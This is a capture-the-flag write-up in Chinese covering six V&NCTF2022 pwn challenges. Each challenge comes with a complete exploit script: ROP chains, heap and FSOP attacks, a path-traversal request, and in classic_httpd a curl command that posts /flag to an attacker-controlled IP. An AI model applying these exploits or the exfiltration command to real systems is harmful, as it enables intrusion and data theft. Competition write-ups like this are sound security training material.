# V&NCTF2022-pwn-wp



## VNCTF-2022-pwn-wp

`V&NCTF2022`比赛中`pwn`的题`wp`，更新完毕。

- 上午在`HideOnHeap`中浪费了太多的时间，尝试了好几个思路都失败了，以后还是不能太头铁（下次还敢
- 平时得多积累一些有用的函数或脚本，比如`_IO_str_finish`拿`shell`的`IO_FILE`构造函数

<!-- more -->

### clear_got

#### checksec

![image-20220212213020242](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212213020242.png)

没有给`libc`，后来测出来远程使用的版本是`libc6_2.23-0ubuntu10_amd64`。

#### 漏洞点

![image-20220212213234651](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212213234651.png)

`main`函数就一个简单直接的栈溢出，但是`got`表被清空，没完全清空，还剩下`__libc_start_main`。后面的`stdout`和`stdin`也都在数据段上。



#### 利用思路

清空了`got`表，考虑使用`ret2syscall`，发现程序中有`syscall; ret`。这里主要是利用了一个`gadget`：

```
0x000000000040075c: mov eax, 0; leave; ret;
```

结合`end2`函数，正好可以泄露出`libc`地址后，执行构造`syscall`调用`read`函数，再重新给`got`表填上。最终思路为：

- 栈溢出并利用`end2`泄露出`__libc_start_main`地址和`_IO_2_1_stdout_`地址

- 使用[libc-search1](https://libc.nullbyte.cat/)或者[libc-search2](https://libc.blukat.me/)查询出远程的`libc`版本
- 重新给`puts@got`填为`system`
- 调用`puts@plt`，实际执行`system("/bin/sh")`获取`shell`

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

# remote libc: libc6_2.23-0ubuntu10_amd64

"""
0x000000000040077e: syscall; ret;
0x00000000004007f3: pop rdi; ret; 
0x00000000004007f1: pop rsi; pop r15; ret; 
0x0000000000400539: ret;
0x000000000040075c: mov eax, 0; leave; ret;
"""

pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1
sysret = 0x000000000040077e


payload = flat({
    0x60:[
        0x000000000040075c,
        pop_rdi,
        1,
        pop_rsi_r15, 
        0x601040,
        0,
        0x400773,
        pop_rdi,
        0,
        pop_rsi_r15,
        0x601008,
        0,
        sysret,
        pop_rdi,
        0x601008,
        elf.plt.puts
    ]
}, length=0x100, filler="\x00")

io.sendafter("Welcome to VNCTF! This is a easy competition.///\n", payload)

msg = io.recvn(0x38)
libc_start_main = u64(msg[:8])
stdout = u64(msg[0x20:0x28])
log_address("libc_start_main", libc_start_main)
log_address("stdout", stdout)
libc_base = libc_start_main - 0x020740 # __libc_start_main offset
log_libc_base_addr(libc_base)
log_address("stdout offset", stdout - libc_base) # validate libc

io.send(flat({
    0: "/bin/sh\x00",
    8: [libc_base + 0x045390]*6 # system
}))

io.interactive()
```

远程打：

![image-20220212214326396](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212214326396.png)



### easyROPtocol

这题其实本地很快出来了，但是远程打`10`次成功`1`次，搞不好中间哪一次就挂了，不知道是不是网的问题。每次`send 0x1000`个字节过去，要睡眠好长时间才能得到远程的回显，而且中间极容易挂，其实可以把报文长度调小一点，只要能打栈溢出就行。赛后尝试每次发送`0xe00`大小的字节过去，但还是挂(真是要命

所以这题啊，多试试，试试就逝世。

#### checksec

![image-20220212215051437](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215051437.png)

没有开`PIE`和栈保护。远程的`libc`版本为：`libc6_2.31-0ubuntu9.2_amd64`。

开启了沙箱：

![image-20220212220711735](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212220711735.png)

#### 漏洞点

在`submit`函数中，存在栈溢出：

![image-20220212215419062](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215419062.png)

#### 利用思路

漏洞点很简单，关键是需要构造好报文，然后可以触发`submit`中的栈溢出漏洞。

分析出报文的组成为：

```c
struct message {
	uint32_t heap; 		// 固定值 0x28b7766e
	uint32_t size; 		// submit函数中的memcpy会校验，依次为1 0x1001 0x2001 0x3001
	uint32_t _1; 		// 不能为0
	uint16_t type; 		// 要么为5要么为6
	uint16_t _2; 		// 不能为0
	uint16_t check_sum; // 校验和
	uint16_t _3; 		// 必须为0
	uint16_t flag1; 	// 可控制submit函数的分支
	uint16_t flag2; 	// 当type为6时，必须为0xffff
	char data[];		// 数据
};
```

计算校验和就是把整个报文加上一个`fakeipheadfa`，每两个字节取整数，然后异或，最后得到的值填充到`check_sum`。

因此，利用思路总结如下：

- 构造好`4`个报文
- 利用栈溢出，使用`write`泄露出`libc`地址（`submit`函数溢出后`rdx`为`6`，正好可以泄露地址）
- 再执行一次`main`函数
- 使用`libc`中的`gadgets`，用`orw`拿`flag`

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def calc_sum(payload):
    res = 0
    payload = b"fakeipheadfa" +  payload
    assert len(payload) % 2 == 0
    for i in range(len(payload) // 2):
        tmp = payload[2*i: 2*i+2]
        tmp = int.from_bytes(tmp, "little")
        res ^= tmp
    return res


def get_message(size, data=b""):
    payload = b""
    payload += p32(0x28b7766e) # head
    payload += p32(size)
    payload += p32(1)
    payload += p16(6)
    payload += p16(1) # 7
    # check sum后续补上
    payload += p16(0)
    payload += p16(1) # 10
    payload += p16(0xffff)
    payload += data
    last = payload[:0x10]+p16(calc_sum(payload))+payload[0x10:]
    return last


def create(size, data=b""):
    io.sendlineafter("4. Quit.\n", "1")
    sleep(1)
    data = get_message(size, data)
    print(f"send message, message length: {len(data)}")
    io.send(data)
    sleep(5)


def delete(idx):
    io.sendlineafter("4. Quit.\n", "2")
    sleep(1)
    io.sendlineafter("Which?", str(idx))

def submit():
    io.sendlineafter("4. Quit.\n", "3")
    sleep(3)

context.update(timeout=10)

payload = cyclic(0xfe8)
create(1, payload)

create(0x1001, payload)
create(0x2001, payload)

pop_rsi_r15= 0x0000000000401bb1

pay_attack = flat(
    [
        pop_rsi_r15, 
        elf.got.atoi,
        0,
        elf.plt.write,
        0x401a5e
    ]
)

create(0x3001, flat({112:pay_attack}, length=0x400))

submit()

libc_base = recv_current_libc_addr(offset=libc.sym.atoi)
log_libc_base_addr(libc_base)
libc.address = libc_base

delete(0)
delete(1)
delete(2)
delete(3)

payload = cyclic(0xfe8)
create(1, payload)
create(0x1001, payload)
create(0x2001, payload)

pop_rsi_r15= 0x0000000000401bb1

rop = ROP(libc)
rop.mprotect(0x404000, 0x1000, 7)
rop.read(0, 0x404600, 0x200)
rop.call(0x404600)
pay_attack = rop.chain()
create(0x3001, flat({114-8:pay_attack}, length=0x400))
submit()

io.send(asm(shellcraft.cat("/flag")))

io.interactive()
```

远程打：

![image-20220212224448669](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212224448669.png)



### FShuiMaster

比较常规的题，有一说一，这一题做得最快。

#### checksec

![image-20220212231939868](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212231939868.png)

保护全开，远程的`libc`版本为：`libc6_2.27-3ubuntu1_amd64`。

#### 漏洞点

在`Edit`函数，存在`off by null`：

![image-20220212232158795](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232158795.png)

#### 利用思路

分析题目后得知，只能分配`largebin chunk`，可输入的范围大概处于`0x430 ~ 0x700`；增删改查都有。使用`largebin attack`结合一个`off by null`，然后打`_IO_list_all`即可完成利用。1

思路总结如下：

- 利用`malloc`残存的地址，泄露出`libc`地址和`heap`地址。泄露堆地址可以用`largebin chunk`上残存的地址。
- `largebin attack`，修改`_IO_list_all`为堆地址
- `exit(0) --> _IO_flush_all_lockp ---> IO_OVERFLOW`调用链完成利用。`libc`版本不高，这里我使用的是`_IO_str_finish`。

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def increase(size, data="deadbeef"):
    io.sendlineafter("Five: Finished!\n\n", "1")
    io.sendlineafter("Number of words?\n", str(size))
    io.sendafter("please input U character\n", data)


def edit(idx, data):
    io.sendlineafter("Five: Finished!\n\n", "2")
    io.sendlineafter("please input the page U want 2 change\n", str(idx))
    io.sendafter("Now Change U this page :", data)


def dele(idx):
    io.sendlineafter("Five: Finished!\n\n", "3")
    io.sendlineafter("please Input the page U want 2 tear off\n", str(idx))

def scan(idx):
    io.sendlineafter("Five: Finished!\n\n", "4")
    io.sendlineafter("please Input The page U want 2 scan\n", str(idx))


def fini():
    io.sendlineafter("Five: Finished!\n\n", "5")


io.sendlineafter("Please Write U Name on the Book\n\n", "roderick")
increase(0x440) # 0
increase(0x448) # 1
increase(0x4f0) # 2
increase(0x440) # 3

dele(0)
edit(1, b"a"*0x440+p64(0x8a0))
dele(2)

increase(0x440) # 4
scan(1)
libc_base = recv_current_libc_addr(offset=0x3ebca0)
log_libc_base_addr(libc_base)
libc.address = libc_base

increase(0x448) # 5 1
increase(0x4f0) # 6

increase(0x440) # 7
increase(0x448, flat({0x440:"\x01"})) # 8
increase(0x450) # 9
increase(0x440) # 10
dele(7)
dele(9)

increase(0x500) # 11

increase(0x440, "a"*8) # 12
scan(12)
m = io.recvline()
heapaddr = u64_ex(m[8:-1])
log_address("heap address", heapaddr)

dele(1)
f = IO_FILE_plus_struct()
pay = f.getshell_by_str_jumps_finish_when_exit(libc_base + 0x3e8360, libc.sym.system, libc.search(b"/bin/sh").__next__())

increase(0x450, flat({0x58:heapaddr+0x110,
    0xb0:0xffffffffffffffff,
    0x100: pay
}) + b"\n") # 13

dele(13)
edit(5, p64(0x3ec0a0 + libc_base) + p64(libc.sym['_IO_list_all']-0x10)[:7]+b"\n")

increase(0x500)

fini()

io.sendline("cat flag")

io.interactive()
```

远程打：

![image-20220212232939711](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232939711.png)





### classic_httpd

后悔了没有先看这个，这题似乎出得有点`bug`，对文件路径的校验存在问题，可以直接目录穿越拿到`flag`。

如题，想起最开始学`httpd`的时候看到的一个[项目](https://github.com/EZLippi/Tinyhttpd)，虽然年代久远，但是很`classic`。

#### checksec

![image-20220214203306951](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203306951.png)

泄露地址后发现，远程的`libc`版本为：`libc6_2.31-0ubuntu9.2_amd64`。

#### 漏洞点

- 对`HTTP`报文请求行处理时候的`bug`，可以直接读到`flag`

![image-20220214204155538](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214204155538.png)



- 在`sub_1EB2`函数中，两处可以泄露地址：

![image-20220214203608034](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203608034.png)



![image-20220214203628544](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203628544.png)



- 在`sub_1EB2`函数中还有`1`处可以任意地址写任意值：

![image-20220214203755071](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203755071.png)

#### 利用思路

对于漏洞`1`，直接发送：

```
"GET /../flag\r\n\r\n"
```

对于其他漏洞的思路：

首先分析出对应的结构体为：

```c
struct Msg{
	int count;
	struct {
		struct {
		uint32_t type; 
		uint64_t addr1; 	
		uint64_t addr2;
		uint64_t write_content;
		
		} unit[0];
	}data;
};
```

处理流程梳理：

```
type:
	0xf1:
		*(addr1 + addr2) = write_content
	0x88:(count <= 1)
		printf("%p", *(addr1 + addr2))
	0x66: count == 0
		addr1 <= 4:
			printf("%p -> %s", addr1, addr2)
	0x12:
		pass
	0x22: addr1 == "ping" strlen(&addr2) <= 0xf
		show msg
```

然后，总结思路如下：

- 泄露程序数据段地址，得到程序加载的基地址
- 泄露`libc`地址
- 修改`strcmp`为`system`地址
- 构造报文，使远程执行命令`system("curl -X POST -F \"flag=@/flag\" ip:port")`，这里的`ip:port`，可以是公网服务器的地址和监听端口，或者在`buuoj`上用小号去`linux basic`开个机器（这里没法用`bash`反弹`shell`，`buu`之前修改规则。但是检测到有`curl`，因此可利用该命令输出`flag`）

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

ip = 'node4.buuoj.cn'
port = 27082
io: tube = remote(ip, port)


context.update(arch="amd64", os="linux", endian="little", log_level="debug")

table = [
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3E, 0xFF, 0xFF, 0xFF, 0x3F,
0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
]

def b64(payload: bytes) -> str:
    p = len(payload) % 3
    if p != 0:
        payload += (3-p) * b"\x00"
    res = ""
    for i in range(0, len(payload), 3):
        x = payload[i]
        y = payload[i+1]
        z = payload[i+2]
        
        a = x >> 2
        b = ((x & 3) << 4) | (y >> 4)
        c = ((y & 0xf) <<2) | (z >> 6)
        d = z & 0x3f
        for t in (a, b, c, d):
            idx = table.index(t)
            res += chr(idx)
    return res


def get_msg(data: bytes):
    return f"GET /submit.cgi?{b64(data)} HTTP/1.0\r\n\r\n"

# get addr
data = p32(1) + p32(0x66) + p64(4) + p64(0) + p64(0)
io.send(get_msg(data))

io.recvuntil("Let us look. Oh! That is ")
m = io.recvline()
# log_ex(f"{m}")

codebase = int16_ex(m[:14]) - 0x4070
log_code_base_addr(codebase)
# 0x4070
io.close()

# connect again
io: tube = remote(ip, port)
# 
data = p32(1) + p32(0x88) + p64(codebase) + p64(0x60c0) + p64(0)
io.send(get_msg(data))

io.recvuntil("OK! I give you some message!\n")
m = io.recvline()
libc_base = int16_ex(m[-15:-1]) - 0x1232c0
log_libc_base_addr(libc_base)
# log_address("printf ", libc_base + 0x64f70)

systemaddr = libc_base + 0x055410

io.close()

# connect again; exec cmd
io: tube = remote(ip, port)
# 
data = p32(2) + p32(0xf1) + p64(codebase) + p64(0x6048) + p64(systemaddr)
data += p32(0x22) + b"ping".ljust(8, b"\x00") + b"curl -X POST -F \"flag=@/flag\" xxx.xxx.xxx.xxx:xxxx" # 这里需要替换为自己的ip和端口
io.send(get_msg(data))
io.recvall(10)

io.close()
```



远程打，利用漏洞`1`：

![image-20220214204403196](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214204403196.png)



利用其他漏洞，首先在公网服务器上监听一个端口：

![image-20220214205110602](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214205110602.png)



然后攻击：

![image-20220214205314212](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214205314212.png)

得到`flag`：

![image-20220214205335759](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214205335759.png)



### BingDwenDwen

这题看都没看，没想到也是简单题

#### checksec

![image-20220214231527747](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214231527747.png)

#### 漏洞点

拍脸上的栈溢出：

![image-20220214231604984](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214231604984.png)

#### 利用思路

题目贴心的给出了需要的`gadgets`，那么直接创建`socket`，反向连接公网服务器即可。做这题的时候我在本地重新编译了一份。

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']

context.update(arch="amd64", endian="little")

if gift.remote:
    pop_rdi = 0x0000000000401356
    pop_rsi = 0x0000000000401358
    pop_rax = 0x000000000040135a
    pop_rcx = 0x000000000040135d
    pop_rdx = 0x0000000000401354
    sys_ret = 0x0000000000401351
    bss_addr = 0x403700
    push_rax_pop_rcx = 0x000000000040135c
    mov_rdi_rcx = 0x000000000040135f

else:
    pop_rdi = 0x000000000040082f
    pop_rsi = 0x0000000000400831
    pop_rax = 0x0000000000400833
    pop_rdx = 0x000000000040082d
    pop_rcx = 0x0000000000400836
    sys_ret = 0x000000000040082a
    bss_addr = 0x6015A0
    push_rax_pop_rcx = 0x0000000000400835
    mov_rdi_rcx = 0x0000000000400839

"""
s = socket(2, 1, 6)
connect(s, &addr, 0x10)
open(/flag)
read(/flag)
write(socket)
"""

payload = flat({
    0x1d0: [
        # socket
        p16(0x2), # AF_INET
        p16(10001,endian="big"), # PORT
        p32(0x7f000001, endian="big"), # ip 127.0.0.1，修改为公网IP
        p64(0), # padding
        "/flag".ljust(8, "\x00")
    ],
    0x10: [
        pop_rdi, 2,
        pop_rsi, 1,
        pop_rdx, 6,
        pop_rax, SyscallNumber.amd64.SOCKET,
        sys_ret, # socket(2, 1, 6)

        push_rax_pop_rcx,
        mov_rdi_rcx,
        pop_rsi, bss_addr+0x1d0,
        pop_rdx, 0x10,
        pop_rax, SyscallNumber.amd64.CONNECT,
        sys_ret, # connect(s, &addr, 0x10)

        pop_rdi, 
        bss_addr+0x1e0,
        pop_rsi, 0,
        pop_rax, SyscallNumber.amd64.OPEN, # open
        sys_ret,

        push_rax_pop_rcx,
        mov_rdi_rcx,
        pop_rsi,
        bss_addr+0x200,
        pop_rdx,
        0x30, # read
        pop_rax, SyscallNumber.amd64.READ,
        sys_ret,

        pop_rdi, 0,
        pop_rsi, bss_addr+0x200,
        pop_rdx, 0x30,
        pop_rax, SyscallNumber.amd64.WRITE, # write
        sys_ret
    ]

})

io.sendlineafter("Hello,Do You Like Bing Dwen Dwen?\n", payload)

io.interactive()
```

远程打：

![image-20220214231914827](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214231914827.png)





### HideOnHeap

这题一开始思路错了，都没往`malloc_assert`上去想......想着有啥侧信道的技巧可以爆破出来，后来尝试了几个，均因为版本太高，没法利用。赛后看了`wp`，自己复现一遍。

#### checksec

![image-20220216233834565](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220216233834565.png)

远程的`libc`版本为：`libc6_2.31-0ubuntu9.2_amd64`。

#### 漏洞点

在`delete`分支有个`double free`

![image-20220216234039466](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220216234039466.png)

#### 利用思路

程序最开始，将`flag`读到了堆上，因此，要想办法泄露堆上的信息。那么在`assert`中，会调用`__fxprintf(stderr, ...)`，这个时候只要劫持了`stderr`，则可进行`FSOP`。题目没有`IO`，没办法泄露地址，基本上把拿`shell`的路堵死了。此处借鉴`house of corrosion`的思路，和`house of husk`很像，都是打`global_max_fast`，然后用`fastbin chunk`进行操作读写。`libc-2.31`对`one_gdaget`的执行条件更为严格。所以，最终还是走泄露这条路。

综上，利用思路为：

- 利用`house of botcake`构造`overlapped chunk`，利用`tcache bin poisoning`，爆破`1/16`，修改`global_max_fast`
- 同上，分配到`stderr`结构体处，为修改`flags`等做准备
- 利用大的`fastbin chunk`，修改`stderr`的`_IO_write_base/ptr/end`，保证`_IO_write_base`距离`flag`的堆地址很近
- 触发一个`assert`，我选择的是`largebin chunk`入链时的`assert(chunk_is_main_arena(p))`，此时会打印出`flag`

#### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def add(size):
    io.sendlineafter("Choice:", "1")
    io.sendlineafter("Size:", str(size))


def edit(idx, data):
    io.sendlineafter("Choice:", "2")
    io.sendlineafter("Index:", str(idx))
    io.sendafter("Content:", data)


def dele(idx):
    io.sendlineafter("Choice:", "3")
    io.sendlineafter("Index:", str(idx))


for i in range(9):
    add(0x80)

for i in range(2, 9):
    dele(i)

dele(0)
dele(1)

add(0x80) # 0

dele(1)

add(0x40) # 1
add(0x30) # 2

add(0x40) # 3
add(0x30) # 4

if gift.debug:
    payload1 = get_current_libcbase_addr() + 0x1eeb80 # global_max_fast
    payload2 = payload1 - 0x1eeb80 + 0x1ec5c0
else:
    payload1 = 0x7b80
    payload2 = 0x55c0

edit(3, p16_ex(payload1))

add(0x80) # 5 3
add(0x80) # 6

add(0x40) # 7
add(0x600) # 8
add(0x10) # 9
add(0x600) # 10
add(0x10)  # 11
dele(8)
add(0x14c0) # 8
add(0x14d0) # 12
dele(10)

edit(8, flat({0x380:[0, 0x21, 0, 0, 0, 0x21]}))

dele(7)
dele(1)
dele(3)

edit(5, p8(0x90))

edit(2, p16_ex(payload2))
add(0x40) # 1
add(0x40) # 3

add(0x40) # 7

edit(3, flat({0x38:0x14c1}))

edit(6, p32(0x61616161))
dele(1)
dele(8)
dele(12)

add(0x14b0)
edit(1, flat({0x4c0:[0, 0x615]}))
dele(1)
edit(7, flat(0xfbad1800, "\x00" * 0x19))

edit(6, p32(0x80))

add(0x10)

m = io.recv()
if b"flag" in m:
    log_ex(f"find flag: {m}")
else:
    raise RuntimeError()

io.interactive()
```



远程打：

![image-20220216233742463](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220216233742463.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2022-02-12-vnctf2022-pwn-wp/  

